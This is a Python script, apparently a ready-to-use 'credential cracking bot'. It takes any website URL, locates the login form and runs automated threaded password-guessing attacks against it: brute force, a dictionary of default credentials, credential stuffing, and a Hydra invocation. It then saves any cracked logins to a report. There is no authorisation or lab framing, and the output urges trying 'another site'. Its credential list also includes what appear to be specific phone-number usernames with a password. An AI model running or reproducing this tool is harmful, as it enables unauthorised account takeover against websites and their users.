#!/usr/bin/env python3
"""
ULTIMATE CREDENTIAL CRACKING BOT
Inapata credentials kwa kutumia URL pekee
Techniques: Brute Force → Dictionary → Credential Stuffing → Hydra
"""

import requests
import threading
import time
import json
import random
import subprocess
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from datetime import datetime

class UltimateCredentialCracker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        })
        self.found_credentials = []
        self.login_url = None
        self.form_details = None
    
    def discover_login_page(self, base_url):
        """Discover login page automatically"""
        print("🔍 Discovering login page...")
        
        try:
            response = self.session.get(base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for login forms
            login_indicators = ['login', 'signin', 'sign-in', 'auth', 'authenticate']
            
            for form in soup.find_all('form'):
                form_action = form.get('action', '').lower()
                form_html = str(form).lower()
                
                # Check if this looks like a login form
                if any(indicator in form_action for indicator in login_indicators) or \
                   any(indicator in form_html for indicator in login_indicators):
                    
                    # Extract form details
                    form_info = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'post').lower(),
                        'inputs': {}
                    }
                    
                    for inp in form.find_all('input'):
                        name = inp.get('name', '')
                        if name:
                            form_info['inputs'][name] = {
                                'type': inp.get('type', 'text'),
                                'value': inp.get('value', '')
                            }
                    
                    login_url = urljoin(base_url, form_info['action'])
                    print(f"✅ Login page found: {login_url}")
                    return login_url, form_info
            
            # If no login form found, try common login paths
            common_paths = ['/login', '/signin', '/auth', '/admin', '/wp-login.php']
            
            for path in common_paths:
                try:
                    test_url = urljoin(base_url, path)
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"✅ Login page found: {test_url}")
                        return test_url, self.analyze_login_form(test_url)
                except:
                    continue
            
            print("❌ No login page found")
            return None, None
            
        except Exception as e:
            print(f"❌ Login discovery error: {e}")
            return None, None
    
    def analyze_login_form(self, login_url):
        """Analyze login form structure"""
        try:
            response = self.session.get(login_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')
            
            if not form:
                return None
            
            form_info = {
                'action': form.get('action', ''),
                'method': form.get('method', 'post').lower(),
                'inputs': {}
            }
            
            for inp in form.find_all('input'):
                name = inp.get('name', '')
                if name:
                    form_info['inputs'][name] = {
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    }
            
            return form_info
            
        except Exception as e:
            print(f"❌ Form analysis error: {e}")
            return None
    
    def smart_brute_force(self, login_url, form_details):
        """Smart Brute Force Attack"""
        print("\n💥 PHASE 1: SMART BRUTE FORCE ATTACK")
        print("=" * 40)
        
        # Common username lists
        usernames = [
            'admin', 'administrator', 'root', 'test', 'user', 'demo',
            'ghost', 'error', 'manager', 'operator', 'support'
        ]
        
        # Common password lists  
        passwords = [
            'admin', 'password', '123456', '12345678', '1234', '12345',
            'test', 'demo', 'pass', 'password1', '123', 'abc123',
            'admin123', 'letmein', 'welcome', 'monkey', 'password123'
        ]
        
        found_creds = []
        
        def try_credentials(username, password):
            try:
                # Prepare form data
                form_data = {}
                username_field = None
                password_field = None
                
                for field_name, field_info in form_details['inputs'].items():
                    if field_info['type'] in ['text', 'email', 'username']:
                        username_field = field_name
                        form_data[field_name] = username
                    elif field_info['type'] == 'password':
                        password_field = field_name
                        form_data[field_name] = password
                    elif field_info['type'] == 'hidden':
                        form_data[field_name] = field_info['value']
                
                if not username_field or not password_field:
                    print("❌ Cannot identify username/password fields")
                    return False
                
                # Submit login
                form_action = form_details.get('action', '')
                submit_url = urljoin(login_url, form_action)
                method = form_details.get('method', 'post')
                
                if method == 'post':
                    response = self.session.post(submit_url, data=form_data, allow_redirects=False)
                else:
                    response = self.session.get(submit_url, params=form_data, allow_redirects=False)
                
                # Check for successful login
                if response.status_code in [302, 303] or 'dashboard' in response.url.lower():
                    found_creds.append({'username': username, 'password': password})
                    print(f"🎉 CRACKED: {username}:{password}")
                    return True
                
                return False
                
            except Exception as e:
                return False
        
        # Multi-threaded brute force
        threads = []
        credentials_tried = 0
        
        for username in usernames:
            for password in passwords:
                if found_creds:
                    break
                    
                thread = threading.Thread(target=try_credentials, args=(username, password))
                threads.append(thread)
                thread.start()
                credentials_tried += 1
                
                if len(threads) >= 5:
                    for t in threads:
                        t.join()
                    threads = []
                
                time.sleep(0.1)
        
        for t in threads:
            t.join()
        
        print(f"📊 Brute force completed: {credentials_tried} attempts")
        return found_creds
    
    def dictionary_attack(self, login_url, form_details):
        """Dictionary Attack with Common Credentials"""
        print("\n📚 PHASE 2: DICTIONARY ATTACK")
        print("=" * 40)
        
        # Extended dictionary of common credentials
        common_credentials = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'admin', 'password': '123456'},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'root', 'password': 'root'},
            {'username': 'test', 'password': 'test'},
            {'username': 'demo', 'password': 'demo'},
            {'username': 'user', 'password': 'user'},
            {'username': 'guest', 'password': 'guest'},
            {'username': 'admin', 'password': 'admin123'},
            {'username': 'admin', 'password': 'Passw0rd'},
            {'username': 'admin', 'password': 'p@ssw0rd'},
            {'username': 'admin', 'password': '1234'},
            {'username': 'admin', 'password': '12345'},
            {'username': 'admin', 'password': '123456789'},
            {'username': 'admin', 'password': 'qwerty'},
            {'username': 'admin', 'password': 'abc123'},
            {'username': 'admin', 'password': 'password1'},
            {'username': 'admin', 'password': '12345678'},
            {'username': 'admin', 'password': 'zinch'},
            {'username': 'admin', 'password': 'g_czechout'},
            {'username': 'admin', 'password': 'asdf'},
            {'username': 'admin', 'password': 'password123'},
            {'username': '+255783707477', 'password': '12345@'},
            {'username': '+255777848484', 'password': '12345@'},
            {'username': 'error', 'password': '12345@'}
        ]
        
        found_creds = []
        
        def try_dictionary_creds(cred):
            try:
                form_data = {}
                username_field = None
                password_field = None
                
                for field_name, field_info in form_details['inputs'].items():
                    if field_info['type'] in ['text', 'email', 'username', 'tel']:
                        username_field = field_name
                        form_data[field_name] = cred['username']
                    elif field_info['type'] == 'password':
                        password_field = field_name
                        form_data[field_name] = cred['password']
                    elif field_info['type'] == 'hidden':
                        form_data[field_name] = field_info['value']
                
                if not username_field or not password_field:
                    return False
                
                form_action = form_details.get('action', '')
                submit_url = urljoin(login_url, form_action)
                method = form_details.get('method', 'post')
                
                if method == 'post':
                    response = self.session.post(submit_url, data=form_data, allow_redirects=False)
                else:
                    response = self.session.get(submit_url, params=form_data, allow_redirects=False)
                
                if response.status_code in [302, 303] or 'dashboard' in response.url.lower():
                    found_creds.append(cred)
                    print(f"🎉 DICTIONARY CRACKED: {cred['username']}:{cred['password']}")
                    return True
                
                return False
                
            except Exception as e:
                return False
        
        threads = []
        for cred in common_credentials:
            if found_creds:
                break
                
            thread = threading.Thread(target=try_dictionary_creds, args=(cred,))
            threads.append(thread)
            thread.start()
            
            if len(threads) >= 5:
                for t in threads:
                    t.join()
                threads = []
            
            time.sleep(0.2)
        
        for t in threads:
            t.join()
        
        print(f"📊 Dictionary attack completed: {len(common_credentials)} attempts")
        return found_creds
    
    def credential_stuffing(self, login_url, form_details):
        """Credential Stuffing with Breached Data Patterns"""
        print("\n🔥 PHASE 3: CREDENTIAL STUFFING")
        print("=" * 40)
        
        # Common breached credentials patterns
        breached_patterns = [
            {'username': 'admin', 'password': 'P@ssw0rd'},
            {'username': 'admin', 'password': 'Admin@123'},
            {'username': 'administrator', 'password': 'Admin!123'},
            {'username': 'root', 'password': 'toor'},
            {'username': 'test', 'password': 'Test123!'},
            {'username': 'user', 'password': 'User@2024'},
            {'username': 'admin', 'password': 'Welcome123'},
            {'username': 'admin', 'password': 'Changeme123'},
            {'username': 'admin', 'password': 'Default1'},
            {'username': 'admin', 'password': 'Password1!'},
            {'username': 'admin', 'password': 'Abc123!'},
            {'username': 'admin', 'password': 'Qwerty123'},
            {'username': 'admin', 'password': 'Summer2024!'},
            {'username': 'admin', 'password': 'Winter2024!'},
            {'username': 'admin', 'password': 'Spring2024!'},
            {'username': 'admin', 'password': 'Fall2024!'},
            {'username': 'admin', 'password': 'Company123!'},
            {'username': 'admin', 'password': 'Server2024'},
            {'username': 'admin', 'password': 'Database1!'}
        ]
        
        found_creds = []
        
        for cred in breached_patterns:
            if found_creds:
                break
                
            try:
                form_data = {}
                for field_name, field_info in form_details['inputs'].items():
                    if field_info['type'] in ['text', 'email', 'username', 'tel']:
                        form_data[field_name] = cred['username']
                    elif field_info['type'] == 'password':
                        form_data[field_name] = cred['password']
                    elif field_info['type'] == 'hidden':
                        form_data[field_name] = field_info['value']
                
                form_action = form_details.get('action', '')
                submit_url = urljoin(login_url, form_action)
                method = form_details.get('method', 'post')
                
                if method == 'post':
                    response = self.session.post(submit_url, data=form_data, allow_redirects=False)
                else:
                    response = self.session.get(submit_url, params=form_data, allow_redirects=False)
                
                if response.status_code in [302, 303] or 'dashboard' in response.url.lower():
                    found_creds.append(cred)
                    print(f"🎉 CREDENTIAL STUFFING CRACKED: {cred['username']}:{cred['password']}")
                    break
                    
            except Exception as e:
                continue
            
            time.sleep(0.3)
        
        print(f"📊 Credential stuffing completed: {len(breached_patterns)} attempts")
        return found_creds
    
    def hydra_attack(self, login_url, form_details):
        """Hydra Attack (Final Option)"""
        print("\n💀 PHASE 4: HYDRA ATTACK")
        print("=" * 40)
        
        try:
            # Create wordlist file for Hydra
            wordlist_file = f"hydra_wordlist_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(wordlist_file, 'w') as f:
                # Common passwords
                common_passwords = [
                    'admin', 'password', '123456', '12345678', '1234',
                    'test', 'demo', '12345', 'pass', 'password1'
                ]
                for pwd in common_passwords:
                    f.write(f"{pwd}\n")
            
            # Identify form fields
            username_field = None
            password_field = None
            
            for field_name, field_info in form_details['inputs'].items():
                if field_info['type'] in ['text', 'email', 'username', 'tel']:
                    username_field = field_name
                elif field_info['type'] == 'password':
                    password_field = field_name
            
            if not username_field or not password_field:
                print("❌ Cannot identify form fields for Hydra")
                return []
            
            # Build Hydra command
            hydra_cmd = [
                'hydra', '-L', '/dev/null', '-P', wordlist_file,
                '-f', '-V', login_url,
                'http-post-form',
                f"/{urlparse(login_url).path}:{username_field}=^USER^&{password_field}=^PASS^:F=incorrect"
            ]
            
            print(f"🚀 Executing Hydra: {' '.join(hydra_cmd)}")
            
            # Run Hydra
            result = subprocess.run(hydra_cmd, capture_output=True, text=True, timeout=300)
            
            # Parse Hydra output
            if 'successfully' in result.stdout.lower():
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'login:' in line.lower() and 'password:' in line.lower():
                        # Extract credentials from Hydra output
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[2] if parts[2] != 'null' else 'admin'
                            password = parts[3]
                            print(f"🎉 HYDRA CRACKED: {username}:{password}")
                            return [{'username': username, 'password': password}]
            
            print("❌ Hydra attack failed")
            return []
            
        except subprocess.TimeoutExpired:
            print("⏰ Hydra timeout")
            return []
        except Exception as e:
            print(f"❌ Hydra error: {e}")
            return []
        finally:
            # Cleanup
            if os.path.exists(wordlist_file):
                os.remove(wordlist_file)
    
    def ultimate_credential_attack(self, target_url):
        """Ultimate Credential Cracking Sequence"""
        print("🚀 STARTING ULTIMATE CREDENTIAL CRACKING ATTACK")
        print("=" * 60)
        print(f"🎯 TARGET: {target_url}")
        print("=" * 60)
        
        start_time = time.time()
        found_credentials = []
        
        # Phase 1: Discover Login Page
        print("\n📋 PHASE 1: LOGIN PAGE DISCOVERY")
        print("-" * 30)
        
        login_url, form_details = self.discover_login_page(target_url)
        
        if not login_url or not form_details:
            print("❌ Cannot proceed without login page")
            return []
        
        print(f"✅ Login URL: {login_url}")
        print(f"✅ Form Method: {form_details['method']}")
        print(f"✅ Form Fields: {list(form_details['inputs'].keys())}")
        
        # Phase 2: Smart Brute Force
        brute_results = self.smart_brute_force(login_url, form_details)
        if brute_results:
            found_credentials.extend(brute_results)
            print("🎉 BRUTE FORCE SUCCESSFUL!")
        else:
            print("❌ Brute force failed")
        
        # Phase 3: Dictionary Attack
        if not found_credentials:
            dict_results = self.dictionary_attack(login_url, form_details)
            if dict_results:
                found_credentials.extend(dict_results)
                print("🎉 DICTIONARY ATTACK SUCCESSFUL!")
            else:
                print("❌ Dictionary attack failed")
        
        # Phase 4: Credential Stuffing
        if not found_credentials:
            stuffing_results = self.credential_stuffing(login_url, form_details)
            if stuffing_results:
                found_credentials.extend(stuffing_results)
                print("🎉 CREDENTIAL STUFFING SUCCESSFUL!")
            else:
                print("❌ Credential stuffing failed")
        
        # Phase 5: Hydra Attack (Final Option)
        if not found_credentials:
            hydra_results = self.hydra_attack(login_url, form_details)
            if hydra_results:
                found_credentials.extend(hydra_results)
                print("🎉 HYDRA ATTACK SUCCESSFUL!")
            else:
                print("❌ All attack methods failed")
        
        # Generate Report
        end_time = time.time()
        scan_duration = end_time - start_time
        
        report = {
            'target_url': target_url,
            'login_url': login_url,
            'scan_date': datetime.now().isoformat(),
            'scan_duration': f"{scan_duration:.2f} seconds",
            'credentials_found': len(found_credentials),
            'found_credentials': found_credentials,
            'attack_sequence': [
                'Brute Force',
                'Dictionary Attack', 
                'Credential Stuffing',
                'Hydra Attack'
            ]
        }
        
        # Save report
        filename = f"ultimate_cracking_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"💾 Report saved: {filename}")
        
        # Display final results
        self.display_final_results(report)
        
        return found_credentials
    
    def display_final_results(self, report):
        """Display final cracking results"""
        print("\n" + "=" * 70)
        print("🎯 ULTIMATE CREDENTIAL CRACKING RESULTS")
        print("=" * 70)
        print(f"🎯 Target: {report['target_url']}")
        print(f"📅 Scan Date: {report['scan_date']}")
        print(f"⏱️ Duration: {report['scan_duration']}")
        print(f"🔑 Credentials Found: {report['credentials_found']}")
        
        if report['credentials_found'] > 0:
            print(f"\n💀 CRACKED CREDENTIALS:")
            for i, cred in enumerate(report['found_credentials'], 1):
                print(f"   {i}. 👤 Username: {cred['username']}")
                print(f"      🔑 Password: {cred['password']}")
                print(f"      ✅ Status: ACCESS GRANTED")
        else:
            print(f"\n❌ No credentials found")
            print("💡 Try: Different attack methods or target another site")
        
        print(f"\n🔧 ATTACKS PERFORMED:")
        for attack in report['attack_sequence']:
            status = "✅ SUCCESS" if report['credentials_found'] > 0 else "❌ FAILED"
            print(f"   • {attack}: {status}")

def main():
    print("🚀 ULTIMATE CREDENTIAL CRACKING BOT")
    print("=" * 70)
    print("Cracks credentials using URL only - No prior knowledge needed!")
    print("=" * 70)
    
    # Get target URL
    target_url = input("🌐 Enter target website URL: ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Check if Hydra is available
    try:
        subprocess.run(['hydra', '-h'], capture_output=True)
        print("✅ Hydra is available")
    except:
        print("⚠️ Hydra not available (will use Python methods only)")
    
    # Create bot and run attack
    bot = UltimateCredentialCracker()
    
    try:
        print(f"\n🎯 Starting ultimate credential attack on: {target_url}")
        print("⚠️ This will perform intensive credential cracking...")
        print("⏳ May take 2-10 minutes depending on the site...")
        
        credentials = bot.ultimate_credential_attack(target_url)
        
        if credentials:
            print("\n🎉 ATTACK COMPLETED SUCCESSFULLY!")
            print("🔓 Credentials obtained!")
        else:
            print("\n❌ ATTACK FAILED")
            print("💡 Target appears to be secure")
        
    except KeyboardInterrupt:
        print("\n⏹️ Attack stopped by user")
    except Exception as e:
        print(f"💥 Attack failed: {e}")

if __name__ == "__main__":
    main()
